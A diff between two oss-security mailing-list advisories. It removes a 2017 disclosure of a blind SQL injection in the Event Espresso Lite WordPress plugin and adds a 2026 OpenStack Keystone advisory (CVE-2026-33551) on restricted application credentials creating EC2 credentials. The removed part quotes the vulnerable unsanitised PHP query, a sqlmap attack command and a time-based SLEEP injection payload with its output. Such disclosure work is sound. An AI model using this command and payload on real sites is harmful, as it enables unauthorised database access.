@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2364" "Tuesday" "11" "July" "2017" "16:10:45" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<4E8FC4EB-4CE5-4AC4-A9E0-B304BC6B9683@me.com>" "57" "[oss-security] Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L, fixed in v3.1.37.12.L" "^Date:" nil nil "7" "2017071120:10:45" "[oss-security] Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L, fixed in v3.1.37.12.L" (number mark "U       larry0@me.co Jul 11   57/2364  " thread-indent "\"[oss-security] Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.11.L, fixed in v3.1.37.12.L\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 12233 invoked by uid 550); 11 Jul 2017 20:11:01 -0000
+Received: (qmail 1637 invoked by uid 550); 7 Apr 2026 17:43:24 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,88 +6,116 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 12205 invoked from network); 11 Jul 2017 20:10:59 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
-	t=1499803847; bh=N8iB6ACJFFL3zds0/e2B10dn9F1dkTEb53dORcxkua4=;
-	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
-	b=jFXZVQPM67czOsFnIMgXd15Te2542wdqfzHYYye0CFhe4kmF3IN69j4pgZZBll4Lr
- 76+jz14pQF0ZJXjA4457/fE8TvU0mlElzuxrbxaBbAem2G04pyRX6apDuvhxWXT2dl
- 1RtVBzvnn9AsyQmD6f5PhEfJHgNHgDWvA1Iqhl+ihtE/CYJn8Co24oJnZSOFN38kkO
- 40hT7ysnGC47yd3cuwKsqqDVn/6HiukXVhRzZvMk687wvEsLz/BWwQJ5oWiTtHIYwj
- zIJg4JmhEhCtuoOohfa8uFWeeVndI7PlqK16VUWa/Y04UlSy7goDjAqv2M1rt+857v
- p6pO+bUj5i8DA==
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2017-07-11_10:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1034 suspectscore=2 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1701120000 definitions=main-1707110325
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-Message-id: <4E8FC4EB-4CE5-4AC4-A9E0-B304BC6B9683@me.com>
-MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
-X-Mailer: Apple Mail (2.3124)
-Date: Tue, 11 Jul 2017 16:10:45 -0400
-From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Blind SQL injection in wordpress plugin event-espresso-free
- v3.1.37.11.L, fixed in v3.1.37.12.L
-To: Open Source Security <oss-security@lists.openwall.com>
+x-ms-reactions: disallow
+Received: (qmail 1604 invoked from network); 7 Apr 2026 17:43:24 -0000
+Date: Tue, 7 Apr 2026 17:43:13 +0000
+From: Jeremy Stanley <fungi@yuggoth.org>
+To: oss-security@lists.openwall.com
+Message-ID: <adVCMfyYzsn4r8BF@yuggoth.org>
+Mail-Followup-To: oss-security@lists.openwall.com
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha512;
+	protocol="application/pgp-signature"; boundary="rDqkOVx0nGTtiZc9"
+Content-Disposition: inline
+X-SA-Exim-Connect-IP: 66.70.103.60
+X-SA-Exim-Rcpt-To: oss-security@lists.openwall.com
+X-SA-Exim-Mail-From: fungi@yuggoth.org
+X-SA-Exim-Scanned: No (on azathoth.yuggoth.org); SAEximRunCond expanded to false
+Subject: [oss-security] [OSSA-2026-005] Keystone: Restricted application credentials can
+ create EC2 credentials (CVE-2026-33551)
 
-Title: Blind SQL injection in wordpress plugin event-espresso-free v3.1.37.=
-11.L
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-07-04
-CVE-ID:[CVE-2017-1002026]
-Download Site: https://wordpress.org/plugins/event-espresso-free/
-Vendor: https://eventespresso.com/
-Vendor Notified: 2017-07-07, fixed v3.1.37.12.L
-Vendor Contact: plugins@wordpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=3D197
-Description: Event Espresso Lite =E2=80=93 Event Management and Registratio=
-n System
-Vulnerability:
-The function  edit_event_category does not sanitize user-supplied input via=
- the $id parameter before passing it into an SQL statement.  This allows a =
-blind SQL attack by an authenticated user who can edit the event categories.
+--rDqkOVx0nGTtiZc9
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D
+OSSA-2026-005: Restricted application credentials can create EC2 credentials
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D
+
+:Date: April 07, 2026
+:CVE: CVE-2026-33551
 
 
-2-function edit_event_category(){
-3-	global $wpdb;
-4-=09
-5:	$id=3D$_REQUEST['id'];
-6-	$results =3D $wpdb->get_results("SELECT * FROM ". EVENTS_CATEGORY_TABLE =
-." WHERE id =3D".$id);
-7-	foreach ($results as $result){
-8-		$category_id =3D $result->id;
-9-		$category_name =3D stripslashes($result->category_name);
-10-		$category_identifier =3D stripslashes($result->category_identifier);
+Affects
+~~~~~~~
+- Keystone: >=3D14.0.0 <26.1.1, =3D=3D27.0.0, =3D=3D28.0.0, =3D=3D29.0.0
 
-Export: JSON TEXT XML
-Exploit Code:
-	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?pag=
-e=3Devent_categories&action=3Dedit&id=3D*' --load-cookies=3D./cookie.txt --=
-level=3D2 --risk=3D2 --dbms=3Dmysql
-	=E2=80=A2=20=20
-	=E2=80=A2=20=20
-	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
-he others (if any)? [y/N]=20
-	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
-of 364 HTTP(s) requests:
-	=E2=80=A2 ---
-	=E2=80=A2 Parameter: #1* (URI)
-	=E2=80=A2     Type: AND/OR time-based blind
-	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
-	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/admin.php?=
-page=3Devent_categories&action=3Dedit&id=3D(CASE WHEN (6856=3D6856) THEN SL=
-EEP(5) ELSE 6856 END)
-	=E2=80=A2 ---
-	=E2=80=A2 [14:53:44] [INFO] the back-end DBMS is MySQL
-	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
-	=E2=80=A2 web application technology: Apache 2.4.18
-	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
-	=E2=80=A2 [14:53:44] [INFO] fetched data logged to text files under '/home=
-/larry/.sqlmap/output/example.com'
-	=E2=80=A2=20=20
-	=E2=80=A2 [*] shutting down at 14:53:44
-	=E2=80=A2=20=20=
+
+Description
+~~~~~~~~~~~
+Maxence Bornecque from Orange Cyberdefense CERT Vulnerability=20
+Intelligence Watch Team reported a vulnerability in Keystone's EC2=20
+credential creation endpoint. By using a restricted application=20
+credential to call the EC2 credential creation API, an authenticated=20
+user with only a reader role may obtain an EC2/S3 credential that=20
+carries the full set of the parent user's S3 permissions,=20
+effectively bypassing the role restrictions imposed on the=20
+application credential. Only deployments that use restricted=20
+application credentials in combination with the EC2/S3 compatibility=20
+API (swift3 / s3api) are affected.
+
+
+
+Patches
+~~~~~~~
+- https://review.opendev.org/983597 (2024.1/caracal)
+- https://review.opendev.org/983591 (2024.2/dalmatian)
+- https://review.opendev.org/983589 (2025.1/epoxy)
+- https://review.opendev.org/983588 (2025.2/flamingo)
+- https://review.opendev.org/983593 (2026.1/gazpacho)
+- https://review.opendev.org/983587 (2026.2/hibiscus)
+
+
+Credits
+~~~~~~~
+- Maxence Bornecque from Orange Cyberdefense CERT Vulnerability
+   Intelligence Watch Team (CVE-2026-33551)
+
+
+References
+~~~~~~~~~~
+- https://launchpad.net/bugs/2142138
+- http://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2026-33551
+
+
+Notes
+~~~~~
+- The unmaintained/2024.1 branch is unmaintained and will receive no
+   new point releases, but a patch for it is provided as a courtesy.
+
+--=20
+Jeremy Stanley
+OpenStack Vulnerability Management Team
+https://security.openstack.org/vmt.html
+
+--rDqkOVx0nGTtiZc9
+Content-Type: application/pgp-signature; name="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQKTBAABCgB9FiEEl65Jb8At7J/DU7LnSPmWEUNJWCkFAmnVQjFfFIAAAAAALgAo
+aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDk3
+QUU0OTZGQzAyREVDOUZDMzUzQjJFNzQ4Rjk5NjExNDM0OTU4MjkACgkQSPmWEUNJ
+WCm1PRAA1qocbkvBeRnRlN4ABH0TO/rQ5magfH+XuhBqogsfhJvdKpflyO9DqPCa
+TOMZTBq+E+SVU0ApbjvNDANtTxEAmenThtv2LIEjlNDjnT7XOdO0uZ7IwlVnUTb/
+1oo9UqlW54kSzGgDjdVrBUqJP2Pj54xnVrj7iUr7aEAOlZozOrB1clvXiffOhizp
+Zq9iZEhYGLtfIkqHHhr8ldLDX7X/xuh7LPIEQ6tbNbEOwafz7MMFLIRPoZmcWvqk
+9SkPsfoHlW5f2ftX+j++Ci63GfaNxhUuQmA96e1F56vbnh5vCV4izwxLyLJfmIxY
+pWKftBrt/99+DRTX8gEt2I8UY6PqS9cvNVZpLwzSN5eFE8CKqhrCjw/iBOAuhwqK
+zaaKwoVzsrLI4Lo8bSog66eiwBpqZaB8zc4gvJIVvgc2DXqnBtoH3DuX4sRfG93w
+YkNsDN+zIJS9r7W6icxD78s9HfWJNVWMyU84s8g3NSYund3syor3o5rCSbvUV1FV
+s9zzuAb/5Q0IjqRwgLtK54Ig1JUPHKobSrxhWzlsj2b+cCwVk6lkqiseRskhzzNk
+CgPwUAd8PJza4zrL97AZrMWsjwBd4TdSXOhlER/qxPHS+bNMwLzHoChRVLn6z5Vm
+olTL+TgnNds2w1hSMMTxYmZsaUqk6UWBqahK9RF4FEoxrHau9zs=
+=Inzm
+-----END PGP SIGNATURE-----
+
+--rDqkOVx0nGTtiZc9--
